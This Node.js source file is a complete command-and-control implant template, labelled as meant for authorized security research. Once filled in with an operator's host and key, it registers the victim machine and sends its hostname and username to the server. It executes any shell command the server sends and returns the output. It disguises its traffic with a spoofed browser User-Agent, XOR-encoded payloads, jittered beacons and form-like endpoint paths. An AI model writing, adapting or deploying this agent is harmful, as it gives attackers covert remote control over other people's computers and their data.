// JavaScript HTTP/HTTPS C2 Agent (Node.js) - For authorized security research only
const http = require('http');
const https = require('https');
const { exec } = require('child_process');
const os = require('os');
const process = require('process');

const C2_HOST = "{{C2_HOST}}";
const C2_PORT = {{C2_PORT}};
const C2_SCHEME = "{{C2_SCHEME}}";
const RECONNECT_DELAY = 5000;
const VERIFY_SSL = {{VERIFY_SSL}};
let BEACON_MODE = {{BEACON_MODE}};
let BEACON_INTERVAL = {{BEACON_INTERVAL}};
let BEACON_JITTER = {{BEACON_JITTER}};

const BASE_URL = `${C2_SCHEME}://${C2_HOST}:${C2_PORT}`;

function simpleEncrypt(data) {
    const key = Buffer.from('{{ENCRYPTION_KEY}}');
    const dataBuffer = Buffer.from(data);
    const encrypted = Buffer.alloc(dataBuffer.length);
    for (let i = 0; i < dataBuffer.length; i++) {
        encrypted[i] = dataBuffer[i] ^ key[i % key.length];
    }
    return encrypted.toString('base64');
}

function simpleDecrypt(data) {
    const key = Buffer.from('{{ENCRYPTION_KEY}}');
    const dataBuffer = Buffer.from(data, 'base64');
    const decrypted = Buffer.alloc(dataBuffer.length);
    for (let i = 0; i < dataBuffer.length; i++) {
        decrypted[i] = dataBuffer[i] ^ key[i % key.length];
    }
    return decrypted.toString('utf8');
}

function getMetadata() {
    return {
        hostname: os.hostname(),
        username: os.userInfo().username,
        os: os.type(),
        os_version: os.release(),
        architecture: os.arch(),
        platform: process.platform,
        mode: BEACON_MODE ? 'beacon' : 'streaming',
        beacon_interval: BEACON_INTERVAL,
        beacon_jitter: BEACON_JITTER
    };
}

function executeCommand(command) {
    return new Promise((resolve) => {
        exec(command, { timeout: 30000, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
            if (error) {
                resolve(`Error: ${error.message}`);
            } else {
                const output = stdout + stderr;
                resolve(output || 'Command executed successfully (no output)');
            }
        });
    });
}

function calculateSleepTime(baseInterval, jitterPercent) {
    if (jitterPercent <= 0 || jitterPercent > 100) return baseInterval;
    const jitterAmount = baseInterval * (jitterPercent / 100.0);
    const minSleep = Math.max(0, baseInterval - jitterAmount);
    const maxSleep = baseInterval + jitterAmount;
    return minSleep + Math.random() * (maxSleep - minSleep);
}

function httpRequest(path, body) {
    return new Promise((resolve) => {
        const url = new URL(path, BASE_URL);
        const client = C2_SCHEME === 'https' ? https : http;

        const options = {
            hostname: url.hostname,
            port: url.port,
            path: url.pathname,
            method: body ? 'POST' : 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            },
            timeout: 60000,
        };

        if (!VERIFY_SSL && C2_SCHEME === 'https') {
            options.rejectUnauthorized = false;
        }

        const req = client.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => { resolve(data); });
        });

        req.on('error', () => { resolve(''); });
        req.on('timeout', () => { req.destroy(); resolve(''); });

        if (body) {
            req.write(body);
        }
        req.end();
    });
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function connectToC2() {
    let agentId = null;
    let pendingResults = [];
    let beaconInterval = BEACON_INTERVAL;
    let beaconJitter = BEACON_JITTER;

    while (true) {
        try {
            // Register if needed
            if (!agentId) {
                const registerMsg = {
                    type: 'register',
                    metadata: getMetadata()
                };
                const encrypted = simpleEncrypt(JSON.stringify(registerMsg));
                const response = await httpRequest('/submit-form', encrypted);

                if (response) {
                    try {
                        const decrypted = simpleDecrypt(response);
                        const data = JSON.parse(decrypted);
                        if (data.type === 'registered' || data.type === 'checkin_ack') {
                            agentId = data.agent_id;
                        }
                    } catch (e) {}
                }

                if (!agentId) {
                    await sleep(RECONNECT_DELAY);
                    continue;
                }
            }

            // Checkin
            const checkinMsg = {
                type: 'checkin',
                agent_id: agentId,
                metadata: getMetadata(),
                results: pendingResults
            };
            const encrypted = simpleEncrypt(JSON.stringify(checkinMsg));
            const response = await httpRequest('/api/v1/update', encrypted);
            pendingResults = [];

            if (response) {
                try {
                    const decrypted = simpleDecrypt(response);
                    const data = JSON.parse(decrypted);

                    if (data.type === 'registered') {
                        agentId = data.agent_id;
                        continue;
                    }

                    if (data.type === 'commands' && data.commands) {
                        for (const cmdData of data.commands) {
                            const command = cmdData.command || '';

                            // Internal commands
                            if (command.startsWith('__set_interval:')) {
                                try {
                                    beaconInterval = parseInt(command.split(':')[1]);
                                } catch (e) {}
                                continue;
                            }
                            if (command === '__kill') {
                                process.exit(0);
                            }
                            if (command.startsWith('__upgrade_ws:')) {
                                // Attempt WebSocket upgrade
                                try {
                                    const wsData = JSON.parse(command.split(':', 1)[1] ? command.substring(command.indexOf(':') + 1) : '{}');
                                    await upgradeToWebSocket(agentId, wsData.ws_host, wsData.ws_port);
                                    return; // Will not return if upgrade succeeds
                                } catch (e) {
                                    pendingResults.push({
                                        type: 'response',
                                        output: 'WebSocket upgrade failed, continuing HTTP',
                                        command: 'upgrade_ws',
                                        timestamp: new Date().toISOString()
                                    });
                                }
                                continue;
                            }

                            if (command) {
                                if (BEACON_MODE) {
                                    // Beacon: queue results for next checkin
                                    const output = await executeCommand(command);
                                    pendingResults.push({
                                        type: 'response',
                                        output: output,
                                        command: command,
                                        timestamp: new Date().toISOString()
                                    });
                                } else {
                                    // Long-poll: send results immediately
                                    const output = await executeCommand(command);
                                    const resultMsg = {
                                        type: 'response',
                                        agent_id: agentId,
                                        output: output,
                                        command: command,
                                        timestamp: new Date().toISOString()
                                    };
                                    const encResult = simpleEncrypt(JSON.stringify(resultMsg));
                                    await httpRequest('/upload', encResult);
                                }
                            }
                        }
                    }
                } catch (e) {}
            }

            if (BEACON_MODE) {
                // Sleep with jitter
                const sleepTime = calculateSleepTime(beaconInterval, beaconJitter) * 1000;
                await sleep(sleepTime);
            }
            // Long-poll mode: immediately re-poll (no sleep)

        } catch (err) {
            await sleep(RECONNECT_DELAY);
        }
    }
}

async function upgradeToWebSocket(agentId, wsHost, wsPort) {
    try {
        const WebSocket = require('ws');
        const uri = `ws://${wsHost}:${wsPort}`;
        const ws = new WebSocket(uri);

        ws.on('open', () => {
            const checkinMsg = {
                type: 'checkin',
                agent_id: agentId,
                metadata: getMetadata()
            };
            ws.send(simpleEncrypt(JSON.stringify(checkinMsg)));

            // Heartbeat
            const heartbeatInterval = setInterval(() => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(simpleEncrypt(JSON.stringify({ type: 'heartbeat' })));
                } else {
                    clearInterval(heartbeatInterval);
                }
            }, 10000);
        });

        ws.on('message', async (data) => {
            try {
                const decrypted = simpleDecrypt(data.toString());
                const message = JSON.parse(decrypted);
                if (message.type === 'command') {
                    const output = await executeCommand(message.command);
                    ws.send(simpleEncrypt(JSON.stringify({ type: 'response', output: output })));
                } else if (message.type === 'kill') {
                    process.exit(0);
                }
            } catch (e) {}
        });

        // Wait for close
        await new Promise((resolve) => { ws.on('close', resolve); });
    } catch (e) {
        // Upgrade failed
    }
}

connectToC2();
